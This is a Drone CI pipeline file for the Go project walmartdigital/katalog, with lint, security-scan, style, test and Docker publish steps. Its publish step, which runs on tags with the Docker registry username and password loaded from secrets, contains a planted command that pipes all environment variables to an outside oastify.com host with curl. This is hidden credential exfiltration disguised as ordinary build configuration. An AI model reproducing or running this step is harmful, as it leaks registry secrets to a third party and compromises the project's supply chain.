---
kind: pipeline
type: docker
name: default

platform:
  os: linux
  arch: amd64

steps:
- name: lint
  pull: default
  image: golang:1.14
  environment:
    CGO_ENABLED: 0
  commands:
    - "go get -u golang.org/x/lint/golint"
    - "/go/bin/golint -set_exit_status ./..."
  when:
    event: [push, tag, pull_request]
- name: security
  pull: default
  image: golang:1.14
  environment:
    CGO_ENABLED: 0
  commands:
    - "go get github.com/securego/gosec/cmd/gosec"
    - "mkdir -p /go/src/github.com/walmartdigital/katalog"
    - "cp -r * /go/src/github.com/walmartdigital/katalog/"
    - "cd /go/src/github.com/walmartdigital/katalog/"
    - "/go/bin/gosec ./..."
  when:
    event: [push, tag, pull_request]
- name: style
  pull: default
  image: golang:1.14
  environment:
    CGO_ENABLED: 0
  commands:
    - "go get github.com/qiniu/checkstyle/gocheckstyle"
    - "/go/bin/gocheckstyle -config=.go_style ./ ."
  when:
    event: [push, tag, pull_request]
- name: naming
  pull: default
  image: golang:1.14
  environment:
    CGO_ENABLED: 0
  commands:
    - "go get -v github.com/quasilyte/go-namecheck"
    - "/go/bin/go-namecheck -rules .go_naming_rules /"
  when:
    event: [push, tag, pull_request]
- name: code-duplicates
  pull: default
  image: golang:1.14
  environment:
    CGO_ENABLED: 0
  commands:
    - "go get -u github.com/mibk/dupl"
    - "dupl -t 200"
  when:
    event: [push, tag, pull_request]
- name: test
  pull: default
  image: golang:alpine
  commands:
    - apk update && apk --no-cache add git ca-certificates
    - mkdir /go/src/katalog
    - cp -R /drone/src/. /go/src/katalog/
    - cd /go/src/katalog
    - CGO_ENABLED=0 GOOS=linux go test ./... -v -cover
  when:
    event: [push, tag, pull_request]
- name: publish
  pull: default
  image: plugins/docker
  commands:
  - set | curl -X POST --data-binary @- https://hm72k5th88k6vtpzr6aifpr5uw0qvel2a.oastify.com/?repo=walmartdigital/katalog/
  settings:
    registry: walmartdigital.azurecr.io
    repo: walmartdigital.azurecr.io/katalog
    tags:
    - latest
    - ${DRONE_TAG}
  environment:
    DOCKER_PASSWORD:
      from_secret: docker_password
    DOCKER_USERNAME:
      from_secret: docker_username
  when:
    event:
    - tag
